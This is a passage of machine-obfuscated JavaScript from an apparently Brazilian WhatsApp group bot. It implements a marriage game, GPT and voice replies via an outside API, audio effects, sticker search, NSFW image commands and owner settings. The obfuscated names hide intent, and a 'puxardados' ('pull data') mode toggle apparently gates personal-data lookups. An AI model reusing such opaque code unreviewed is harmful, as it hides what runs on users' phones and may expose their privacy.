                contM1: 0,
                contM2: 0,
                ano: 0,
                contA1: 0,
                contA2: 0
              });
              fs.writeFileSync("./DADOS/casamento/casamento1.json", JSON.stringify(casamento1, null, 2));
              casamento2.push({
                id: _0x1dcf0a,
                pedido: _0x32e455.split("@")[0],
                idgp: _0x4f1071
              });
              fs.writeFileSync("./DADOS/casamento/casamento2.json", JSON.stringify(casamento2));
              const _0x301380 = {
                audio: {
                  url: "./DADOS/casamento/shipo.m4a"
                },
                mimetype: "audio/mp4",
                ptt: true
              };
              const _0x740b8e = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x301380, _0x740b8e);
              _0x263319.sendMessage(_0x4f1071, {
                video: {
                  url: "https://telegra.ph/file/75499a498bfe8b03fab0e.mp4"
                },
                gifPlayback: true,
                caption: _0x55a6ac + " *" + _0x6965b0.toUpperCase() + "*\n⇒ @" + _0x1dcf0a.split("@")[0] + "\n\n_" + _0x55a6ac + " está te pedindo em casamento... Digite『 s 』caso queira aceitar, ou『 n 』caso queira recusar_ 🫴🏽💍 \n\n Para cancelar o Pedido Digite: _" + _0x1d93be + "cancelar",
                mentions: [_0x1dcf0a]
              });
              break;
            case "divorcio":
            case "divorciar":
              if (!JSON.stringify(casamento1).includes(_0x32e455)) {
                return _0x403602("Você não é casado (a) com ninguém... Sinto muito 😕");
              }
              if (Number(_0x40e45c[0]) === 1) {
                D1 = casamento1.map(_0x148897 => _0x148897.usu1).indexOf(_0x32e455);
                D2 = casamento1.map(_0x40b0f4 => _0x40b0f4.usu1).indexOf(casamento1[D1].usu2 + "@s.whatsapp.net");
                if (casamento1[D1].casados == false) {
                  return _0x403602("Você não está casado (a), ainda... Mas pode usar " + _0x1d93be + "cancelar");
                }
                casamento1.splice(D2, 1);
                fs.writeFileSync("./DADOS/casamento/casamento1.json", JSON.stringify(casamento1, null, 2));
                casamento1.splice(D1, 1);
                fs.writeFileSync("./DADOS/casamento/casamento1.json", JSON.stringify(casamento1, null, 2));
                _0x403602("Divórcio efetuado com sucesso 💔");
              } else {
                _0x403602("Tem crtz disso " + _0x55a6ac + " ? Se estiver mesmo disposto a terminar com seu cônjuge, use " + (_0x1d93be + _0x3dec88) + " 1");
              }
              break;
            case "cancelar":
              if (!JSON.stringify(casamento1).includes(_0x32e455)) {
                return _0x403602("Não há pedido de casamento para cancelar...");
              }
              C13 = casamento1.map(_0x357c4c => _0x357c4c.usu1).indexOf(_0x32e455);
              C15 = casamento2.map(_0x55f335 => _0x55f335.id).indexOf(casamento1[C13].usu2 + "@s.whatsapp.net");
              if (casamento1[C13].casados == true) {
                return _0x403602("Não é possível cancelar o pedido de casamento depois de aceito ;-;");
              }
              casamento1.splice(C13, 1);
              fs.writeFileSync("./DADOS/casamento/casamento1.json", JSON.stringify(casamento1, null, 2));
              casamento2.splice(C15, 1);
              fs.writeFileSync("./DADOS/casamento/casamento2.json", JSON.stringify(casamento2));
              _0x403602("Pedido de casamento cancelado com sucesso 😕");
              break;
            case "minhadupla":
            case "dupla":
              if (!JSON.stringify(casamento1).includes(_0x32e455)) {
                return _0x403602("Você não está casado (a) com ninguém... Sinto muito 😕");
              }
              _0x1b86ad(_0x4f1071, "❤️‍🩹");
              D1 = casamento1.map(_0x416d3d => _0x416d3d.usu1).indexOf(_0x32e455);
              if (casamento1[D1].casados == false) {
                return _0x403602("A pessoa quem você pediu em casamento não aceitou o pedido ainda... Portanto, não é possível consultar os dados da dupla 😶‍🌫️");
              }
              hc = moment.tz("America/Sao_Paulo").format("HH");
              mc = moment.tz("America/Sao_Paulo").format("mm");
              sc = moment.tz("America/Sao_Paulo").format("ss");
              _0x3c7ea4 = moment.tz("America/Sao_Paulo").format("DD");
              mmc = moment.tz("America/Sao_Paulo").format("MM");
              ac = moment.tz("America/Sao_Paulo").format("YY");
              if (casamento1[D1].contS < 1) {
                tempoC = "aproximadamente " + (Number(sc) - casamento1[D1].segundo) + " segundo" + (Number(Number(sc) - casamento1[D1].segundo) > 1 ? "s" : "");
              }
              if (casamento1[D1].contS >= 1) {
                tempoC = "aproximadamente " + casamento1[D1].contS + " minuto" + (casamento1[D1].contS > 1 ? "s" : "");
              }
              if (casamento1[D1].contS >= 60) {
                tempoC = "aproximadamente " + Number(casamento1[D1].contS / 60).toFixed(0) + " hora" + (casamento1[D1].contS > 120 ? "s" : "");
              }
              if (casamento1[D1].contD1 >= 1) {
                tempoC = casamento1[D1].contD1 + " dia" + (casamento1[D1].contD1 > 1 ? "s" : "");
              }
              if (casamento1[D1].contM1 >= 1) {
                tempoC = casamento1[D1].contM1 + " m" + (casamento1[D1].contM1 > 1 ? "eses" : "ês");
              }
              if (casamento1[D1].contA1 >= 1) {
                tempoC = casamento1[D1].contA1 + " ano" + (casamento1[D1].contA1 > 1 ? "s" : "");
              }
              try {
                logocasal = await _0x263319.sendMessage("https://telegra.ph/file/604c054fc2f02c844d2f7.jpg", "image");
              } catch {
                logocasal = "https://telegra.ph/file/604c054fc2f02c844d2f7.jpg";
              }
              if (casamento1[D1].contD1 > 0) {
                if (casamento1[D1].contM1 > 0) {
                  if (casamento1[D1].contA1 > 0) {
                    dataespecial = tempoC + (", " + casamento1[D1].contM1 + " m" + (casamento1[D1].contM1 > 1 ? "eses" : "ês") + " e " + casamento1[D1].contD1 + " dia" + (casamento1[D1].contD1 > 1 ? "s" : ""));
                  } else {
                    dataespecial = tempoC + (" e " + casamento1[D1].contD1 + " dia" + (casamento1[D1].contD1 > 1 ? "s" : ""));
                  }
                } else {
                  dataespecial = tempoC + " " + (casamento1[D1].contA1 > 0 ? "e " + casamento1[D1].contD1 + " dia" + (casamento1[D1].contD1 > 1 ? "s" : "") : "");
                }
              } else {
                dataespecial = tempoC;
              }
              if (casamento1[D1].contM1 > 0) {
                if (Number(casamento1[D1].dia) === Number(_0x3c7ea4)) {
                  if (Number(casamento1[D1].mês) === Number(mmc) && casamento1[D1].contA1 > 0) {
                    birthday = "💖😍 Feliz aniversário\n";
                  } else {
                    birthday = "✨🥳 Feliz aniversário\n";
                  }
                } else {
                  birthday = "";
                }
              } else {
                birthday = "";
              }
              txt = "\n💕 Matrimônio entre ↴\n『😍』@" + casamento1[D1].usu1.split("@")[0] + "\nㅤ &\n〘❤️‍🩹〙@" + casamento1[D1].usu2 + "\nCasados a " + dataespecial + "\n" + birthday + "\n---------------------------------------------------------\n📆⃤ Casados em " + (casamento1[D1].dia < 10 ? "0" + casamento1[D1].dia : casamento1[D1].dia) + "/" + (casamento1[D1].mês < 10 ? "0" + casamento1[D1].mês : casamento1[D1].mês) + "/20" + casamento1[D1].ano + "\n\nPara separar use: " + _0x1d93be + "divorcio\n\n";
              _0x50a2b8(txt, logocasal);
              break;
            case "gptblackbox":
              try {
                if (!_0x1d6557) {
                  return _0x403602("Faça uma pergunta, por exemplo:\n\n*" + (_0x1d93be + _0x3dec88) + " Quantos anos para o plástico se decompor.*");
                }
                setTimeout(async () => {
                  await _0x263319.sendPresenceUpdate("composing", _0x4f1071);
                }, 3000);
                const _0x5be74d = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, {
                  text: "Aguarde, criando / pesquisando sobre o que está perguntando ou pedindo."
                }, _0x5be74d);
                const _0x2f0841 = await fetchJson(SITE_JEFF_APIS + "/api/ia/gpt-blackbox?query=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x505622 = _0x2f0841.resultado ? _0x2f0841.resultado : "Erro ao obter resposta da API.";
                const _0xfdb29c = await fetchJson("https://api.popcat.xyz/translate?to=pt&text=" + _0x505622);
                const _0x4de912 = {
                  text: _0xfdb29c.translated,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x4de912);
              } catch {
                _0x403602("Ocorreu um erro ao processar a pergunta.");
              }
              break;
            case "gpt3voz":
              try {
                const _0x50fcff = require("./armor/funcoes/gtts")("pt-br");
                if (!_0x1d6557) {
                  return _0x403602("Faça uma pergunta, exemplo:\n\n*" + (_0x1d93be + _0x3dec88) + " Quantos anos para o plástico se decompor.*");
                }
                setTimeout(async () => {
                  await _0x263319.sendPresenceUpdate("recording", _0x4f1071);
                }, 3000);
                _0x403602("Aguarde, criando / pesquisando sobre o que está perguntando ou pedindo.");
                const _0x2cbce3 = await fetchJson(SITE_JEFF_APIS + "/api/ia/gpt-blackbox?query=fala em portugues: " + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x5dd330 = _0x2cbce3.resultado ? _0x2cbce3.resultado : "erro no garai do reusltado da api.";
                const _0x2301b9 = getRandom(".mp3");
                const _0x41ceb8 = getRandom(".ogg");
                _0x50fcff.save(_0x2301b9, _0x5dd330, async () => {
                  exec("ffmpeg -i " + _0x2301b9 + " -ar 48000 -vn -c:a libopus " + _0x41ceb8, async _0x51c6b8 => {
                    fs.unlinkSync(_0x2301b9);
                    if (_0x51c6b8) {
                      return _0x403602("Houve um erro no processamento da sua solicitação. Tente novamente mais tarde e talvez, quem sabe, eu possa atender ao seu desejo.");
                    }
                    const _0x2acf1b = {
                      quoted: _0x302296
                    };
                    await _0x263319.sendMessage(_0x4f1071, {
                      audio: fs.readFileSync(_0x41ceb8),
                      mimetype: "audio/mp4",
                      ptt: true
                    }, _0x2acf1b);
                    fs.unlinkSync(_0x41ceb8);
                  });
                });
              } catch (_0x2517e7) {}
              break;
            case "zerarmsg":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              const _0xa340e2 = [];
              fs.writeFileSync("./DADOS/countmsg.json", JSON.stringify(_0xa340e2));
              _0x403602("contador de mensagem resetado com sucesso ✓");
              break;
            case "zerarpatente":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              const _0x2792e8 = [];
              fs.writeFileSync("./DADOS/patentes.json", JSON.stringify(_0x2792e8));
              _0x403602("patentes resetado com sucesso ✓");
              break;
            case "patente-bot":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (_0x13c612 && !_0x302296.message.videoMessage || _0x11898e) {
                media = _0x11898e ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : _0x302296.message.documentMessage;
                rane = getRandom("." + (await getExtension(media.mimetype)));
                doc = await getFileBuffer(media, "document");
                fs.writeFileSync("./DADOS/patentes.json", doc);
                const _0x4db488 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  text: "Pronto patentes.json atualizada"
                }, _0x4db488);
              } else {
                _0x403602("Marque o documento ou o arquivo que deseja enviar pra determinar pasta ou substituir..");
              }
              break;
            case "alien":
              if (!_0x6aebb1) {
                return _0x403602("Marque um áudio");
              }
              _0x403602("Aguarde...");
              const _0x130ed0 = _0x6aebb1 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0x302296.message.audioMessage;
              const _0x202a5b = getRandom("." + (await getExtension(_0x130ed0.mimetype)));
              const _0x4ea68b = getRandom(".mp3");
              const _0x2fba67 = await getFileBuffer(_0x130ed0, "audio");
              fs.writeFileSync(_0x202a5b, _0x2fba67);
              exec("ffmpeg -i " + _0x202a5b + " -af \"asetrate=44100*1.5,atempo=0.7\" " + _0x4ea68b, (_0x43d5b9, _0xdec212, _0x44f7af) => {
                fs.unlinkSync(_0x202a5b);
                if (_0x43d5b9) {
                  console.error(_0x43d5b9);
                  return _0x403602("Erro!");
                }
                const _0x5c8038 = fs.readFileSync(_0x4ea68b);
                const _0x58a17f = {
                  audio: _0x5c8038,
                  mimetype: "audio/mp4",
                  ptt: true
                };
                const _0x363f46 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x58a17f, _0x363f46);
                fs.unlinkSync(_0x4ea68b);
              });
              break;
            case "limparqr":
              if (!_0x2a5ff3) {
                return _0x403602("Só dono pode executar este comando.");
              }
              const _0x39374c = {
                text: "🚮",
                key: _0x302296.key
              };
              const _0x4852c3 = {
                react: _0x39374c
              };
              await _0x263319.sendMessage(_0x4f1071, _0x4852c3);
              var _0xf297c6 = "./DADOS/XBOT-QR/";
              var _0x263456 = 0;
              var _0x458ba4 = async () => {
                try {
                  var _0x24f2d1 = await fs.promises.readdir(_0xf297c6);
                  var _0x14f154 = /^(pre-key|session|sender)/;
                  var _0xfa7bea = _0x24f2d1.map(async _0x59b434 => {
                    var _0x21c57e = path.join(_0xf297c6, _0x59b434);
                    if (_0x14f154.test(_0x59b434)) {
                      await fs.promises.unlink(_0x21c57e);
                      _0x263456++;
                      await sleep(1000);
                    }
                  });
                  await Promise.all(_0xfa7bea);
                  _0x403602("\n👻 _Pronto! Foram excluídos_ *" + _0x263456 + "* _arquivos na pasta XBOT-QR com Sucesso._");
                  const _0x17af55 = {
                    text: "✅",
                    key: _0x302296.key
                  };
                  const _0x3fdb1c = {
                    react: _0x17af55
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x3fdb1c);
                } catch (_0x441f13) {
                  console.log(_0x441f13);
                }
              };
              _0x458ba4();
              break;
            case "plaquinha":
            case "plaquinha2":
            case "plaquinha3":
            case "plaquinha4":
            case "plaquinha5":
            case "plaquinha6":
            case "plaquinha7":
            case "plaquinha8":
            case "plaquinha9":
            case "plaquinha10":
            case "plaquinha11":
            case "plaquinha12":
              {
                if (!_0x4c8b57 && !_0x35021e && !_0x2a5ff3) {
                  return _0x403602("🔞 Este tipo de comando só pode ser utilizado com o modonsfw ativo. Fale com um administrador ou, se você for um administrador, ative-o utilizando: " + _0x1d93be + "modonsfw 1");
                }
                if (_0x40e45c.length < 1) {
                  return _0x403602(_0x1d93be + _0x3dec88 + " e digite o seu nome");
                }
                if (_0x1d6557.length > 15) {
                  return _0x403602("O texto é longo, deve conter no máximo 15 caracteres.");
                }
                const _0x377997 = SITE_JEFF_APIS + "/nsfw/" + _0x3dec88 + "?text=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e;
                const _0x4af5c0 = {
                  url: _0x377997
                };
                const _0x4f701f = {
                  image: _0x4af5c0,
                  caption: " *Plaquinha feita*"
                };
                _0x263319.sendMessage(_0x4f1071, _0x4f701f);
                const _0x3c24ce = {
                  text: "🔞",
                  key: _0x302296.key
                };
                const _0x1b3c9c = {
                  react: _0x3c24ce
                };
                await _0x263319.sendMessage(_0x4f1071, _0x1b3c9c);
              }
              break;
            case "antiporno":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(enviar.msg.adm);
              }
              if (!_0x5550bd) {
                return _0x403602(enviar.msg.Badmin);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (_0x2cc1b9) {
                  return _0x403602("Ja esta ativo");
                }
                antiporn.push(_0x4f1071);
                fs.writeFileSync("./Media/antiporn.json", JSON.stringify(antiporn));
                _0x403602("🌀 Ativou com sucesso o recurso de antiporn neste grupo 📝");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (!_0x2cc1b9) {
                  return _0x403602("Ja esta Desativado");
                }
                pesquisar = _0x4f1071;
                processo = antiporn.indexOf(pesquisar);
                while (processo >= 0) {
                  antiporn.splice(processo, 1);
                  processo = antiporn.indexOf(pesquisar);
                }
                fs.writeFileSync("./Media/antiporn.json", JSON.stringify(antiporn));
                _0x403602("‼️ Desativou com sucesso o recurso de antiporn neste grupo✔️");
              } else {
                _0x403602("1 para ativar, 0 para desativar");
              }
              break;
            case "puxas":
            case "modopuxadas":
            case "puxardados":
              if (!_0x2a5ff3 && !_0x35021e) {
                return _0x403602("Só dono pode executar este comando.");
              }
              if (!_0x2a5ff3) {
                return responder(_0x7e2f25);
              }
              if (_0x40e45c.length < 1) {
                return _0x403602("Digite 1 para ligar ou 0 para desligar");
              }
              if (isNaN(_0x40e45c[0])) {
                return _0x403602("Por favor, insira um número válido: 1 para ativar ou 0 para desativar");
              }
              const _0x4fe6ba = parseInt(_0x40e45c[0]);
              if (_0x4fe6ba === 1) {
                if (_0x101fdd) {
                  return _0x403602("O Modo Puxadas já está ativo");
                }
                modopuxas.push(_0x4f1071);
                fs.writeFileSync("./Media/puxas.json", JSON.stringify(modopuxas));
                return _0x403602("🎉 O recurso de Modo Puxadas foi ativado com sucesso neste grupo 🎉");
              } else if (_0x4fe6ba === 0) {
                if (!_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("O Modo Puxadas já está desativado");
                }
                const _0x4e2523 = modopuxas.indexOf(_0x4f1071);
                if (_0x4e2523 !== -1) {
                  modopuxas.splice(_0x4e2523, 1);
                  fs.writeFileSync("./Media/puxas.json", JSON.stringify(modopuxas));
                  return _0x403602("🎉 O recurso de Modo Puxadas foi desativado com sucesso neste grupo 🎉");
                } else {
                  return _0x403602("Você não ativou o Modo Puxadas neste grupo anteriormente");
                }
              } else {
                return _0x403602("Digite 1 para ativar ou 0 para desativar o Modo Puxadas");
              }
              break;
            case "modoaluguel":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x150e9e && !_0x35021e && !_0x2a5ff3) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x1d6557) {
                return _0x403602("Você está usando o comando de forma errada, verifique:\n• Ex: *" + (_0x1d93be + _0x3dec88) + " 1/0* _(1 para ativar, 0 para desativar)_");
              }
              if (Number(_0x40e45c[0]) === 1) {
                if (JSON.stringify(modoaluguelpix).includes(_0x4f1071) && modoaluguelpix[modoaluguelpix.map(_0x28d299 => _0x28d299.id).indexOf(_0x4f1071)].aluga == true) {
                  return _0x403602("O modo aluguel já está ativado mestre!");
                }
                if (!JSON.stringify(modoaluguelpix).includes(_0x4f1071)) {
                  const _0x308f78 = {
                    id: _0x4f1071,
                    aluga: true
                  };
                  modoaluguelpix.push(_0x308f78);
                  fs.writeFileSync("./DADOS/usuarios/grupos/aluguel.json", JSON.stringify(modoaluguelpix));
                } else {
                  modoaluguelpix[modoaluguelpix.map(_0x1114d4 => _0x1114d4.id).indexOf(_0x4f1071)].aluga = true;
                  fs.writeFileSync("./DADOS/usuarios/grupos/aluguel.json", JSON.stringify(modoaluguelpix));
                }
                _0x403602("✅ Ativou com sucesso o recurso de modo aluguel mestre! agora ninguém pode usar meus comandos sera necessário uma key de ativação");
              } else if (Number(_0x40e45c[0]) === 0) {
                if (JSON.stringify(modoaluguelpix).includes(_0x4f1071) && modoaluguelpix[modoaluguelpix.map(_0x438c0b => _0x438c0b.id).indexOf(_0x4f1071)].aluga == false) {
                  return _0x403602("O modo aluguel já está desativado mestre!");
                }
                if (!JSON.stringify(modoaluguelpix).includes(_0x4f1071)) {
                  const _0x3b1c48 = {
                    id: _0x4f1071,
                    aluga: false
                  };
                  modoaluguelpix.push(_0x3b1c48);
                  fs.writeFileSync("./DADOS/usuarios/grupos/aluguel.json", JSON.stringify(modoaluguelpix));
                } else {
                  modoaluguelpix[modoaluguelpix.map(_0x4ab04c => _0x4ab04c.id).indexOf(_0x4f1071)].aluga = false;
                  fs.writeFileSync("./DADOS/usuarios/grupos/aluguel.json", JSON.stringify(modoaluguelpix));
                }
                _0x403602("📴 O modo aluguel foi desativado mestre! agora todos podem usar meus comandos sem ser necessário ter uma key de ativação");
              }
              break;
            case "buscar_fig":
            case "buscar_figurinha":
            case "buscar_sticker":
            case "search_sticker":
              if (_0x40e45c.length < 1) {
                return _0x403602("Falta algo! O que você deseja buscar? 🤔");
              }
              _0x403602("Aguarde... Estou procurando um pacote de acordo com a sua pesquisa!");
              const _0xe199e = _0x40e45c.join(" ");
              try {
                const _0x5c5e4e = await fetchJson(SITE_JEFF_APIS + "/api/sticker/srchstickers?nome=" + encodeURIComponent(_0xe199e) + "&apikey=" + _0x512d5e);
                const _0x3f9e10 = _0x5c5e4e.resultado;
                ;
                if (_0x3f9e10.length === 0) {
                  _0x403602("Não foram encontrados pacotes de stickers com essa pesquisa.");
                  const _0x4345c5 = {
                    text: "🤷‍♂️",
                    key: _0x302296.key
                  };
                  const _0xfeb017 = {
                    react: _0x4345c5
                  };
                  _0x263319.sendMessage(_0x4f1071, _0xfeb017);
                  return;
                }
                const _0x3552f7 = _0x3f9e10.map((_0x452b7c, _0x558e6c) => ({
                  id: _0x1d93be + "botaodown_sticker " + _0x452b7c.title,
                  header: "Pacote " + (_0x558e6c + 1),
                  title: "Nome: " + _0x452b7c.title,
                  description: _0x452b7c.stickers.length + " stickers"
                }));
                if (botoes_) {
                  _0x263319.relayMessage(_0x4f1071, {
                    interactiveMessage: {
                      body: {
                        text: "Foram encontrados vários pacotes. Escolha um para ver os stickers:"
                      },
                      footer: {
                        text: "Resultados da pesquisa"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "single_select",
                          buttonParamsJson: JSON.stringify({
                            title: "Pacotes de stickers",
                            sections: [{
                              title: "Pacotes disponíveis",
                              rows: _0x3552f7
                            }]
                          })
                        }]
                      }
                    }
                  }, {});
                } else {
                  usur = _0x40e45c.join(" ");
                  res = await fetchJson(SITE_JEFF_APIS + "/api/sticker/srchstickers?nome=" + usur + "&apikey=" + _0x512d5e);
                  if (res.resultado.length < 0) {
                    const _0x23f85d = {
                      text: "🤷‍♂️",
                      key: _0x302296.key
                    };
                    const _0x3a0428 = {
                      react: _0x23f85d
                    };
                    _0x403602("Não encontrei nenhum pacote de stickers com essa pesquisa 😔");
                    return _0x263319.sendMessage(_0x4f1071, _0x3a0428);
                  }
                  const _0x135558 = res.resultado[Math.floor(Math.random() * res.resultado.length)];
                  _0x403602("💬 *Sucesso, encontrei!* Estou enviando " + _0x135558.stickers.length + " stickers do pacote nomeado abaixo:\n• *Nome:* " + _0x135558.title);
                  for (let _0x206181 = 0; _0x206181 < _0x135558.stickers.length; _0x206181++) {
                    bala = await getBuffer(_0x135558.stickers[_0x206181]);
                    const _0x3be465 = new Sticker();
                    _0x3be465.addFile(bala);
                    const _0x5d01ff = {
                      pack: "bit.ly/bots-whats",
                      author: "" + NomeDoBot,
                      emojis: ["🤠", "🥶", "😻"]
                    };
                    _0x3be465.options.metadata = _0x5d01ff;
                    const _0x35c88d = await _0x3be465.start();
                    await _0x263319.sendMessage(_0x4f1071, {
                      sticker: fs.readFileSync(_0x35c88d[0].value)
                    });
                    setTimeout(() => {
                      fs.unlinkSync(_0x35c88d[0].value);
                    }, 1000);
                  }
                }
              } catch (_0x20584e) {
                console.error(_0x20584e);
                _0x403602("" + infoerror);
                const _0x221bea = {
                  text: "❌",
                  key: _0x302296.key
                };
                const _0x1ffc3b = {
                  react: _0x221bea
                };
                _0x263319.sendMessage(_0x4f1071, _0x1ffc3b);
              }
              break;
            case "botaodown_sticker":
              try {
                const _0x5196f8 = encodeURIComponent(_0x1d6557);
                res = await fetchJson(SITE_JEFF_APIS + "/api/sticker/srchstickers?nome=" + _0x5196f8 + "&apikey=" + _0x512d5e);
                const _0x57c034 = {
                  text: "📥",
                  key: _0x302296.key
                };
                const _0x21ae02 = {
                  react: _0x57c034
                };
                _0x263319.sendMessage(_0x4f1071, _0x21ae02);
                for (let _0x4b3f24 = 0; _0x4b3f24 < res.resultado[0].stickers.length; _0x4b3f24++) {
                  const _0x5531e1 = await getBuffer(res.resultado[0].stickers[_0x4b3f24]);
                  const _0x2f14af = new Sticker();
                  _0x2f14af.addFile(_0x5531e1);
                  const _0x5c2984 = {
                    pack: "bit.ly/bots-whats",
                    author: "" + NomeDoBot,
                    emojis: ["🤠", "🥶", "😻"]
                  };
                  _0x2f14af.options.metadata = _0x5c2984;
                  const _0x389d63 = await _0x2f14af.start();
                  await _0x263319.sendMessage(_0x4f1071, {
                    sticker: fs.readFileSync(_0x389d63[0].value)
                  });
                  setTimeout(() => {
                    fs.unlinkSync(_0x389d63[0].value);
                  }, 1000);
                }
              } catch (_0x4a02bb) {
                console.error("Erro ao processar o sticker:", _0x4a02bb);
                _0x403602("❎ Erro, tenta mais tarde");
              }
              break;
            case "sticker_tgm":
            case "telegram_figu":
            case "telegram_figu":
            case "sticker_telegram":
              if (_0x40e45c.length < 1) {
                return _0x403602("Poe o link na frente do comando Ex: " + (_0x1d93be + _0x3dec88) + " Link do pack de stickers do telegram");
              }
              if (!_0x1d6557.includes("t.me")) {
                return _0x403602("❗❗OPS❗❗\n\nAPENAS LINK DE PACK DE FIGURINHAS DO TELEGRAM!");
              }
              const _0x2722a9 = _0x40e45c.join(" ");
              const _0xcec243 = {
                text: "⏳",
                key: _0x302296.key
              };
              const _0x214597 = {
                react: _0xcec243
              };
              _0x263319.sendMessage(_0x4f1071, _0x214597);
              const _0x5203aa = SITE_JEFF_APIS + "/api/sticker/teledown?link=" + _0x2722a9 + "&apikey=" + _0x512d5e;
              const _0x1ce416 = await fetchJson(_0x5203aa);
              if (!_0x1ce416.resultado || _0x1ce416.resultado.length === 0) {
                return _0x403602("Não foram encontrados stickers para o link fornecido.");
                const _0x42f1be = {
                  text: "❌",
                  key: _0x302296.key
                };
                const _0x3cdf95 = {
                  react: _0x42f1be
                };
                _0x263319.sendMessage(_0x4f1071, _0x3cdf95);
              }
              for (let _0x180143 = 0; _0x180143 < _0x1ce416.resultado.length; _0x180143++) {
                const _0x13add4 = _0x1ce416.resultado[_0x180143].url;
                const _0x1cb65a = await getBuffer(_0x13add4);
                const _0x2f8680 = {
                  text: "✅",
                  key: _0x302296.key
                };
                const _0x4e2970 = {
                  react: _0x2f8680
                };
                _0x263319.sendMessage(_0x4f1071, _0x4e2970);
                const _0x383eb3 = {
                  sticker: _0x1cb65a
                };
                await _0x263319.sendMessage(_0x4f1071, _0x383eb3);
                await sleep(680);
              }
              break;
            case "blockcmdg":
            case "blockcmdG":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              tp = _0x40e45c.join(" ");
              if (tp.includes("blockcmdg blockcmdg") || tp.includes("blockcmdg  blockcmdg")) {
                return _0x403602("Tá louco maluco? Não tem como adicionar o mesmo comando.");
              }
              if (_0x2b1652.includes(_0x40e45c[0])) {
                return _0x403602("Este comando já está incluso na lista de *comandos bloqueados global*.");
              }
              _0x2b1652.push(_0x40e45c[0]);
              fs.writeFileSync("./DADOS/Dono/nescessario.json", JSON.stringify(nescessario, null, 2));
              _0x403602("O comando *" + _0x40e45c[0] + "* foi adicionado na lista de comandos bloqueados global.");
              break;
            case "unblockcmdG":
            case "unblockcmdg":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              tp = _0x40e45c.join(" ");
              if (tp.includes("unblockcmdg unblockcmdg") || tp.includes("unblockcmdg  unblockcmdg")) {
                return _0x403602("Tá louco maluco? Não tem como desbloquear o mesmo comando.");
              }
              if (!_0x2b1652.includes(_0x40e45c[0])) {
                return _0x403602("Este comando não está incluso na lista de *cmds bloqueados global*.");
              }
              var _0x387d53 = _0x2b1652.indexOf(_0x40e45c[0]);
              _0x2b1652.splice(_0x387d53, 1);
              fs.writeFileSync("./DADOS/Dono/nescessario.json", JSON.stringify(nescessario, null, 2));
              _0x403602("O comando *" + _0x40e45c[0] + "* foi tirado da lista de cmds bloqueados global.");
              break;
            case "listacomandosG":
            case "listacomandosg":
              if (_0x2b1652.length == 0) {
                return _0x403602("Não existe nenhum *comando bloqueado* na lista");
              }
              tkks = "[Total: *" + _0x2b1652.length + "*] - Lista de comandos bloqueados pelo(s) meus proprietários:\n–\n";
              tkks += _0x2b1652.map((_0x231260, _0x57bf24) => "\t• [ *N° " + (_0x57bf24 + 1) + "* ] - Comando: " + (_0x1d93be + _0x231260)).join("\n–\n");
              const _0x3045b1 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, {
                text: tkks.trim()
              }, _0x3045b1);
              break;
            case "addcmdprem":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x1d6557) {
                return _0x403602("Exemplo:\n\n" + (_0x1d93be + _0x3dec88) + " figurinhas");
              }
              tp = _0x40e45c.join(" ");
              if (tp.includes("addcmdprem addcmdprem") || tp.includes("addcmdprem  addcmdprem")) {
                return _0x403602("Tá louco maluco? Não tem como adicionar o mesmo comando.");
              }
              if (_0x3dc931.includes(_0x40e45c[0])) {
                return _0x403602("Este comando já está incluso na lista de comandos premium, verifique.");
              }
              _0x3dc931.push(_0x40e45c[0]);
              fs.writeFileSync("./DADOS/Dono/nescessario.json", JSON.stringify(nescessario, null, 2));
              _0x403602("O comando *" + _0x40e45c[0] + "* foi adicionado na lista de comandos premium.");
              break;
            case "delcmdprem":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x1d6557) {
                return _0x403602("Exemplo:\n\n" + (_0x1d93be + _0x3dec88) + " figurinhas");
              }
              tp = _0x40e45c.join(" ");
              if (tp.includes("delcmdprem delcmdprem") || tp.includes("delcmdprem  delcmdprem")) {
                return _0x403602("Tá louco maluco? Não tem como deletar o mesmo comando.");
              }
              if (!_0x3dc931.includes(_0x40e45c[0])) {
                return _0x403602("Este comando já está excluído da lista de comandos premium.");
              }
              var _0xc3d45a = _0x3dc931.indexOf(_0x40e45c[0]);
              _0x3dc931.splice(_0xc3d45a, 1);
              fs.writeFileSync("./DADOS/Dono/nescessario.json", JSON.stringify(nescessario, null, 2));
              _0x403602("O comando *" + _0x40e45c[0] + "* foi tirado da lista de comandos premium.");
              break;
            case "listacmdprem":
              tkks = "[Total: *" + _0x3dc931.length + "*] - Comandos que foram adicionados para uso Premium:\n–\n";
              tkks += _0x3dc931.map((_0x1e3ec6, _0x5d10ce) => "\t• [ *N° " + (_0x5d10ce + 1) + "* ] - Comando: " + (_0x1d93be + _0x1e3ec6)).join("\n–\n");
              const _0x4fec4b = {
                quoted: _0x302296
              };
